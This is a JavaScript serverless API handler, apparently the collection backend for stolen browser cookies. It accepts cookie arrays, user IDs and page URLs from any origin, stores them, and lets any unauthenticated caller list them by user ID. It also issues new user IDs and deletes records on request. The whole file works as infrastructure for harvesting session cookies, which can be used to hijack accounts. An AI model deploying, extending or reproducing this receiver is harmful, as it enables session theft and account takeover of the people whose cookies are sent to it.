let posts = [];
let lastUserId = 0;

const rateLimit = {
  windowMs: 15 * 60 * 1000, // 15 minutes
  maxRequests: 100, // limit each IP to 100 requests per windowMs
  requests: new Map(),
  cleanup: function() {
    const now = Date.now();
    for (const [key, value] of this.requests.entries()) {
      if (now - value.timestamp > this.windowMs) {
        this.requests.delete(key);
      }
    }
  }
};

function checkRateLimit(req) {
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const now = Date.now();
  
  rateLimit.cleanup();
  
  const clientRequests = rateLimit.requests.get(ip) || { count: 0, timestamp: now };
  
  if (now - clientRequests.timestamp > rateLimit.windowMs) {
    clientRequests.count = 1;
    clientRequests.timestamp = now;
  } else {
    clientRequests.count++;
  }
  
  rateLimit.requests.set(ip, clientRequests);
  
  return clientRequests.count <= rateLimit.maxRequests;
}

function validatePostData(body) {
  if (!body) return { isValid: false, error: 'Missing request body' };
  if (!body.userId) return { isValid: false, error: 'Missing userId' };
  if (!body.cookies || !Array.isArray(body.cookies)) return { isValid: false, error: 'Invalid cookies data' };
  return { isValid: true };
}

export default function handler(req, res) {
  // CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Accept, X-Retry-Count, X-Request-Time');
  res.setHeader('Access-Control-Expose-Headers', 'X-RateLimit-Remaining');

  // Handle OPTIONS request for CORS
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  // Check rate limit
  if (!checkRateLimit(req)) {
    return res.status(429).json({
      error: 'Too many requests',
      retryAfter: Math.ceil(rateLimit.windowMs / 1000)
    });
  }

  try {
    switch (req.method) {
      case 'POST':
        handlePost(req, res);
        break;
      case 'GET':
        handleGet(req, res);
        break;
      case 'PUT':
        handlePut(req, res);
        break;
      case 'DELETE':
        handleDelete(req, res);
        break;
      default:
        res.status(405).json({ error: 'Method not allowed' });
    }
  } catch (error) {
    console.error('Error in webhook handler:', error);
    res.status(500).json({ error: 'Internal server error', message: error.message });
  }
}

function handlePost(req, res) {
  let body = req.body;
  if (typeof body === 'string') {
    try { 
      body = JSON.parse(body); 
    } catch (e) {
      return res.status(400).json({ error: 'Invalid JSON' });
    }
  }

  const validation = validatePostData(body);
  if (!validation.isValid) {
    return res.status(400).json({ error: validation.error });
  }

  const data = {
    id: Date.now().toString(),
    time: new Date().toISOString(),
    userId: body.userId,
    cookieCount: body.cookies ? body.cookies.length : 0,
    url: body.url,
    body
  };

  // Limit array size to prevent memory issues
  if (posts.length >= 1000) {
    posts = posts.slice(0, 900);
  }

  posts.unshift(data);
  res.status(200).json({ 
    status: 'ok', 
    received: data,
    queuePosition: posts.length
  });
}

function handleGet(req, res) {
  const { userId, limit } = req.query;
  let filteredPosts = posts;

  if (userId) {
    filteredPosts = posts.filter(post => post.userId === userId);
  }

  if (limit) {
    filteredPosts = filteredPosts.slice(0, parseInt(limit));
  }

  res.status(200).json(filteredPosts);
}

function handlePut(req, res) {
  lastUserId++;
  res.status(200).json({ userId: lastUserId.toString() });
}

function handleDelete(req, res) {
  let body = req.body;
  if (typeof body === 'string') {
    try { 
      body = JSON.parse(body); 
    } catch (e) {
      return res.status(400).json({ error: 'Invalid JSON' });
    }
  }

  if (body.userId) {
    // Belirli bir kullanıcının verilerini sil
    posts = posts.filter(post => post.userId !== body.userId);
  } else if (body.ids && Array.isArray(body.ids)) {
    // Seçili ID'lere sahip verileri sil
    posts = posts.filter(post => !body.ids.includes(post.id));
  } else if (body.deleteAll === true) {
    // Tüm verileri sil
    posts = [];
  }

  res.status(200).json({ status: 'ok', message: 'Data deleted successfully' });
}